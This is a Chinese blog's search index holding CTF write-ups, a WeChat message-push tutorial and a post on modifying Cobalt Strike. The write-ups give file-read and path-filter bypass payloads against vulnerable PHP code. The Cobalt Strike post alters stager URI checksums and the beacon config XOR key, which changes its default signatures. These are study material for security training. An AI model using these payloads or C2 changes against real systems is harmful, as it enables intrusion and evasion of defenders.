<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2023 技能兴鲁“信息创大赛” 学生组 日志里的Flag</title>
    <link href="/2023/11/16/2023%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81/"/>
    <url>/2023/11/16/2023%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81/</url>
    
    <content type="html"><![CDATA[<h3 id="日志里的FLAG："><a href="#日志里的FLAG：" class="headerlink" title="日志里的FLAG："></a>日志里的FLAG：</h3><span id="more"></span><blockquote><p>提示说在日志里面，访问网页探测为Nginx服务器，读nginx对应的日志：<br>分析服务器为Nginx 读取对应日志位置<br>上代码：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;FLAG就存在于日志文件里哦！&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;path&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;path&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag|\$|[&quot;\&#x27;]/i&#x27;</span>, <span class="hljs-variable">$path</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;错误&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$path</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;log&quot;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$path</span>);<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$path</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$path</span>)) &#123;<br>            <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$path</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">highlight_string</span>(<span class="hljs-variable">$content</span>, <span class="hljs-literal">true</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件不存在&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;请提供文件路径&quot;</span>;<br>&#125;<br>FLAG就存在于日志文件里哦！请提供文件路径<br></code></pre></td></tr></table></figure><p><code> $path = str_replace(&quot;log&quot;,&quot;&quot;, $path);</code>替换,使用双写进行绕过</p><p><code>/var/lologg/nginx/access.llogog</code></p><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p> <code>?path=/var/lologg/nginx/access.llogog</code>‘</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>使用微信推送课程消息</title>
    <link href="/2022/11/17/%E4%BD%BF%E7%94%A8%E5%BE%AE%E4%BF%A1%E6%8E%A8%E9%80%81%E8%AF%BE%E7%A8%8B%E4%BF%A1%E6%81%AF/"/>
    <url>/2022/11/17/%E4%BD%BF%E7%94%A8%E5%BE%AE%E4%BF%A1%E6%8E%A8%E9%80%81%E8%AF%BE%E7%A8%8B%E4%BF%A1%E6%81%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="使用微信推送课程信息"><a href="#使用微信推送课程信息" class="headerlink" title="使用微信推送课程信息"></a>使用微信推送课程信息</h1><blockquote><p>使用Python+微信公众号测试平台推送信息</p></blockquote><span id="more"></span><h2 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h2><p>因为我的公众号再创建的时候选择的是个人，所以不能进行认证，也就不能给用户推送模板消息，所以此程序是基于微信公众平台接口测试，来实现的微信公众号消息推送的，每个人都可以到这里去申请测试号——&gt;&gt;&gt;<a href="https://mp.weixin.qq.com/debug/cgi-bin/sandbox?t=sandbox/login">URL</a></p><h2 id="注册账号-获取appID与appSecret以及测试的公众号"><a href="#注册账号-获取appID与appSecret以及测试的公众号" class="headerlink" title="注册账号 获取appID与appSecret以及测试的公众号"></a>注册账号 获取appID与appSecret以及测试的公众号</h2><p>注册成功后登陆获取<code>appID</code>与<code>appSercret</code></p><p><img src="/img/image-20221117201008541.png" alt="image-20221117201008541"></p><p>获取测试号二维码</p><p><img src="/img/image-20221117201246821.png" alt="image-20221117201246821"></p><h3 id="创建推送模版"><a href="#创建推送模版" class="headerlink" title="创建推送模版"></a>创建推送模版</h3><p>新增测试模版——-&gt;模版标题为推送标题,模版内容填<code>&#123;&#123;user.DATA&#125;&#125; &#123;&#123;weather.DATA&#125;&#125; &#123;&#123;hitokoto.DATA&#125;&#125;</code></p><p>至此,你已经获取到了模版ID</p><p><img src="/img/image-20221117201340977.png" alt="image-20221117201340977"></p><h2 id="0x02-脚本编写"><a href="#0x02-脚本编写" class="headerlink" title="0x02 脚本编写"></a>0x02 脚本编写</h2><h3 id="首先获取Access-Token"><a href="#首先获取Access-Token" class="headerlink" title="首先获取Access_Token"></a>首先获取Access_Token</h3><p>根据<a href="https://developers.weixin.qq.com/doc/offiaccount/Basic_Information/Get_access_token.html">微信官方文档</a></p><p><img src="/img/image-20221117202033545.png" alt="image-20221117202033545"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br>appID = <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-comment">#此处填写第一步获取的appID</span><br>appSecret = <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-comment">#此处填写获取获取的appSecret</span><br><br>......................................<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getAccessToken</span>(<span class="hljs-params">appId, appSecret</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    @获取getAccessToken</span><br><span class="hljs-string">    :param APPID:微信平台账号ID信息</span><br><span class="hljs-string">    :param APPSECRET:微信平台账号密钥信息</span><br><span class="hljs-string">    :return: &#x27;access_token&#x27; 微信平台认证Token</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    url = <span class="hljs-string">&#x27;https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;appid=&#x27;</span> + APPID + <span class="hljs-string">&#x27;&amp;secret=&#x27;</span> + APPSECRET + <span class="hljs-string">&#x27;&#x27;</span><br>    response = requests.get(url)<br>    result = json.loads(response.text)<br>    <span class="hljs-keyword">return</span> result[<span class="hljs-string">&#x27;access_token&#x27;</span>]<br>  <br> .........................................<br></code></pre></td></tr></table></figure><h3 id="推送信息"><a href="#推送信息" class="headerlink" title="推送信息:"></a>推送信息:</h3><p>根据<a href="https://mp.weixin.qq.com/debug/cgi-bin/readtmpl?t=tmplmsg/faq_tmpl">微信官方文档</a></p><p>调用方法:</p><ul><li>第一步：获取template_id（注意：仅微信开放平台同事可获取）</li></ul><p>通过向微信公众平台申请模板，来获取模板id。</p><ul><li>第二步：请求接口</li></ul><p>请注意，URL置空，则在发送后，点击模板消息会进入一个空白页面(IOS)，或无法点击(Android)。</p><p>POST请求</p><p><code>https://api.weixin.qq.com/cgi-bin/message/template/send?access_token=ACCESS_TOKEN</code></p><p>请求包为Json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;touser&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;OPENID&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;template_id&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ngqIpbwh8bUfcSsECmogfXcV14J0tQlEpBO27izEYtY&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;http://weixin.qq.com/download&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;topcolor&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;#FF0000&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;data&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;User&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;黄先生&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;color&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;#173177&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Date&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;06月07日 19时24分&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;color&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;#173177&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><blockquote><p>参数说明</p></blockquote><table><thead><tr><th>参数</th><th>是否必须</th><th>说明</th></tr></thead><tbody><tr><td>touser</td><td>是</td><td>向指定用户发送,需要先获取OPENID</td></tr><tr><td>template_id</td><td>是</td><td>对指定模版进行发送,template_id</td></tr><tr><td>url</td><td>是</td><td>URL置空，则在发送后，点击模板消息会进入一个空白页面(IOS)，或无法点击(Android)。</td></tr><tr><td>Data</td><td>是</td><td>Json包,通过Data数据来渲染发送的信息</td></tr></tbody></table><p>根据API文档构建Python脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python">.......................................<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pushMessage</span>(<span class="hljs-params">appID, appsecret, openID,template_id</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    @Author:Chrrr1y</span><br><span class="hljs-string">    :param appID: 微信开发平台信息AppID</span><br><span class="hljs-string">    :param appsecret: 微信开发平台信息appsercret</span><br><span class="hljs-string">    :param openID: 账号主体ID信息</span><br><span class="hljs-string">    :param template_id 微信开发平台template_id</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    access_token = getAccessToken(appID, appsecret)<br>    url = <span class="hljs-string">&#x27;https://api.weixin.qq.com/cgi-bin/message/template/send?access_token=&#x27;</span> + access_token<br>    message = <span class="hljs-string">&#x27;&#x27;</span><br>    data = &#123;<br>        <span class="hljs-string">&quot;touser&quot;</span>: openID,<br>        <span class="hljs-string">&quot;template_id&quot;</span>: template_id,<br>    <span class="hljs-string">&quot;url&quot;</span>:<span class="hljs-string">&quot;http://weixin.qq.com/download&quot;</span>,<br>        <span class="hljs-string">&quot;topcolor&quot;</span>: <span class="hljs-string">&quot;#FF0000&quot;</span>,<br>        <span class="hljs-string">&quot;data&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;user&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;value&quot;</span>: message,<br>            &#125;,<br>            <span class="hljs-string">&quot;weather&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;value&quot;</span>: value<br>            &#125;,<br>        &#125;<br>    &#125;<br>    response = requests.post(url, json=data, headers=headers)<br>    <br>.........................................<br></code></pre></td></tr></table></figure><p>至此,脚本构建完成</p><h3 id="0x03-效果截图"><a href="#0x03-效果截图" class="headerlink" title="0x03 效果截图"></a>0x03 效果截图</h3><p><img src="/img/image-20221118204606701.png" alt="image-20221118204606701"></p><p><img src="/img/image-20221118204628742.png" alt="image-20221118204628742"></p><h3 id="0x04-FAQ"><a href="#0x04-FAQ" class="headerlink" title="0x04 FAQ:"></a>0x04 FAQ:</h3><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>OPENID</td><td>关注测试公众号之后,即可获取微信用户OPENID</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>GXYCTF 2019-BabySqliv3.0.1 WirteUp</title>
    <link href="/2022/11/15/CTF-BabysqliV3.01/"/>
    <url>/2022/11/15/CTF-BabysqliV3.01/</url>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目:"></a>题目:</h1><ul><li>[GXYCTF2019] BabysqliV3.0 1</li></ul><span id="more"></span><p><img src="/img/image-20221115165634705.png" alt="image-20221115165634705"></p><h2 id="WP"><a href="#WP" class="headerlink" title="WP:"></a>WP:</h2><p>打开题目,尝试弱口令登陆：</p><blockquote><p>admin&#x2F;password</p></blockquote><p>登录成功,发现上传,可以看出来是一个文件上传的题目，点击右键查看源代码，未发现有效信息，在地址栏发现?file&#x3D;upload,从此处猜测应该是需要构造一个伪协议。从题目上来说，需要查看源码进行代码审计，于是构造一个payload:</p><p><code>?file=php://filter/convert.base64-encode/resource=upload.php</code></p><p><img src="/img/image-20221115195410357.png" alt="image-20221115195410357"></p><p>发现<code>.php</code>会被替换成<code>.fxxkyou</code>,并且程序会自动添加PHP,尝试替换为<code>upload</code></p><p>&#96;&#96;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;upload&#96;</p><p><img src="/img/image-20221115195430656.png" alt="image-20221115195430656"></p><p>获取Base64编码解码</p><p><strong>Upload.php</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; <br><br>&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;<br>上传文件<br>&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;<br>&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot; /&gt;<br>&lt;/form&gt;<br><br>&lt;?php<br>error_reporting(0);<br>class Uploader&#123;<br>public $Filename;<br>public $cmd;<br>public $token;<br><br><br>function __construct()&#123;<br>$sandbox = getcwd().&quot;/uploads/&quot;.md5($_SESSION[&#x27;user&#x27;]).&quot;/&quot;;<br>$ext = &quot;.txt&quot;;<br>@mkdir($sandbox, 0777, true);<br>if(isset($_GET[&#x27;name&#x27;]) and !preg_match(&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;, $_GET[&#x27;name&#x27;]))&#123;<br>$this-&gt;Filename = $_GET[&#x27;name&#x27;];<br>&#125;<br>else&#123;<br>$this-&gt;Filename = $sandbox.$_SESSION[&#x27;user&#x27;].$ext;<br>&#125;<br><br>$this-&gt;cmd = &quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;;<br>$this-&gt;token = $_SESSION[&#x27;user&#x27;];<br>&#125;<br><br>function upload($file)&#123;<br>global $sandbox;<br>global $ext;<br><br>if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename))&#123;<br>$this-&gt;cmd = &quot;die(&#x27;illegal filename!&#x27;);&quot;;<br>&#125;<br>else&#123;<br>if($file[&#x27;size&#x27;] &gt; 1024)&#123;<br>$this-&gt;cmd = &quot;die(&#x27;you are too big (′▽`〃)&#x27;);&quot;;<br>&#125;<br>else&#123;<br>$this-&gt;cmd = &quot;move_uploaded_file(&#x27;&quot;.$file[&#x27;tmp_name&#x27;].&quot;&#x27;, &#x27;&quot; . $this-&gt;Filename . &quot;&#x27;);&quot;;<br>&#125;<br>&#125;<br>&#125;<br><br>function __toString()&#123;<br>global $sandbox;<br>global $ext;<br>// return $sandbox.$this-&gt;Filename.$ext;<br>return $this-&gt;Filename;<br>&#125;<br><br>function __destruct()&#123;<br>if($this-&gt;token != $_SESSION[&#x27;user&#x27;])&#123;<br>$this-&gt;cmd = &quot;die(&#x27;check token falied!&#x27;);&quot;;<br>&#125;<br>eval($this-&gt;cmd);<br>&#125;<br>&#125;<br><br>if(isset($_FILES[&#x27;file&#x27;])) &#123;<br>$uploader = new Uploader();<br>$uploader-&gt;upload($_FILES[&quot;file&quot;]);<br>if(@file_get_contents($uploader))&#123;<br>echo &quot;下面是你上传的文件：&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;;<br>echo file_get_contents($uploader);<br>&#125;<br>&#125;<br><br>?&gt;<br><br></code></pre></td></tr></table></figure><p><strong>home.php</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>session_start();<br>echo &quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html; charset=utf-8\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;;<br>error_reporting(0);<br>if(isset($_SESSION[&#x27;user&#x27;]))&#123;<br>if(isset($_GET[&#x27;file&#x27;]))&#123;<br>if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#x27;file&#x27;]))&#123;<br>die(&quot;hacker!&quot;);<br>&#125;<br>else&#123;<br>if(preg_match(&quot;/home$/i&quot;, $_GET[&#x27;file&#x27;]) or preg_match(&quot;/upload$/i&quot;, $_GET[&#x27;file&#x27;]))&#123;<br>$file = $_GET[&#x27;file&#x27;].&quot;.php&quot;;<br>&#125;<br>else&#123;<br>$file = $_GET[&#x27;file&#x27;].&quot;.fxxkyou!&quot;;<br>&#125;<br>echo &quot;当前引用的是 &quot;.$file;<br>require $file;<br>&#125;<br><br>&#125;<br>else&#123;<br>die(&quot;no permission!&quot;);<br>&#125;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>审计代码发现:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">..........<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]))&#123;<br><span class="hljs-variable language_">$this</span>-&gt;Filename = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>&#125;<br>..........<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br><span class="hljs-variable">$uploader</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uploader</span>();<br><span class="hljs-variable">$uploader</span>-&gt;<span class="hljs-title function_ invoke__">upload</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]);<br><span class="hljs-keyword">if</span>(@<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uploader</span>))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;下面是你上传的文件：&lt;br&gt;&quot;</span>.<span class="hljs-variable">$uploader</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uploader</span>);<br>&#125;<br>&#125;<br>..........<br></code></pre></td></tr></table></figure><blockquote><p>审计源码其中有<code>file_get_contents($uploader)</code>方法，读取文件内容。根据源码分析，网站目录下有一个文件为flag.php,我们可以利用<code>@file_get_contents($uploader)</code>，读取flag文件，而且,源码中没有对flag进行过滤，因此可以通过将Filename参数改为flag来读取flag信息.</p></blockquote><p>构造Payload:</p><p><code>?file=upload&amp;name=/var/www/html/falg.php</code></p><p><img src="/img/image-20221115201059418.png" alt="image-20221115201059418"></p><p>获得Flag</p><p><code>flag&#123;67518dcd-0155-4032-a231-05bb2b52ca5b&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CobaltStrike二次开发</title>
    <link href="/2022/05/26/CobaltStrike%20%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"/>
    <url>/2022/05/26/CobaltStrike%20%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/</url>
    
    <content type="html"><![CDATA[<h1 id="CobaltStrike二次开发"><a href="#CobaltStrike二次开发" class="headerlink" title="CobaltStrike二次开发"></a>CobaltStrike二次开发</h1><h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><blockquote><p>CobaltStrike（简称CS）作为一款渗透测试神器，采用C&#x2F;S架构，可进行分布式团队协作。<span id="more"></span>CS集成了端口转发、服务扫描、自动化溢出、多模式端口监听、Windows exe与dll 木马生成、Java 木马生成、Office 宏病毒生成、木马捆绑等强大功能,针对他的功能我们进行二次开发</p></blockquote><h2 id="0x01-准备环境"><a href="#0x01-准备环境" class="headerlink" title="0x01 准备环境"></a>0x01 准备环境</h2><ul><li>IDEA</li><li>CobaltStikre 4.4</li></ul><h2 id="0x02-修改CheckSum8上线链接"><a href="#0x02-修改CheckSum8上线链接" class="headerlink" title="0x02 修改CheckSum8上线链接"></a>0x02 修改CheckSum8上线链接</h2><h3 id="修改文件-一处"><a href="#修改文件-一处" class="headerlink" title="修改文件(一处)"></a>修改文件(一处)</h3><ul><li>cloudstrike\WebServer.java</li></ul><p><a href="https://c.runoob.com/compile/10/">在线CheckSum8计算脚本</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EchoTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">checksum8</span><span class="hljs-params">(String text)</span> &#123;<br>        <span class="hljs-keyword">if</span> (text.length() &lt; <span class="hljs-number">4</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>;<br>        &#125;<br>        text = text.replace(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-type">long</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0L</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; x &lt; text.length(); x++) &#123;<br>            sum += text.charAt(x);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> sum;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(checksum8(<span class="hljs-string">&quot;生成的地址&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/image-20220428172017304.png" alt="image-20220428172017304"></p><p>修改<code>isStager</code>和<code>isStagerX64</code>的<code>return checksum8(uri)==</code>你计算的长度即可上线</p><p><code>isStagerX64</code>的<code>return</code>须删掉后边<code>uri.matches(&quot;/[A-Za-z0-9]&#123;4&#125;&quot;);</code></p><h3 id="修改文件-二处"><a href="#修改文件-二处" class="headerlink" title="修改文件(二处)"></a>修改文件(二处)</h3><ul><li>common\CommonUtils.java</li></ul><p><img src="/img/image-20220428172348165.png" alt="image-20220428172348165"></p><p>修改<code>String MSFURI</code>和<code>String MSFURI_X64</code>两个函数 直接<code>return</code>你计算的地址</p><h2 id="0x03修改BeaconConfig的异或密钥"><a href="#0x03修改BeaconConfig的异或密钥" class="headerlink" title="0x03修改BeaconConfig的异或密钥"></a>0x03修改BeaconConfig的异或密钥</h2><h3 id="修改文件"><a href="#修改文件" class="headerlink" title="修改文件"></a>修改文件</h3><ul><li>beacon\BeaconPayload.java</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 